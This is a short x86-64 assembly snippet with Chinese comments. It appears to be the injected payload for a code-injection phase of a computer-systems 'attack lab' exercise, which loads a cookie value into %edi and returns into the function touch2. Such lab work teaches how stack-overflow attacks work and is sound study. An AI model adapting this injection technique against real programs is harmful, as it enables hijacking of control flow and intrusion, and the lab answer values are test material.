subq    $0x10,%rsp		# 指向 touch2 的起始地址
movl    $0x59b997fa,%edi        # 设置 touch2 的参数 val 为 cookie
retq                            # 弹出 touch2 的起始地址赋值给 PC
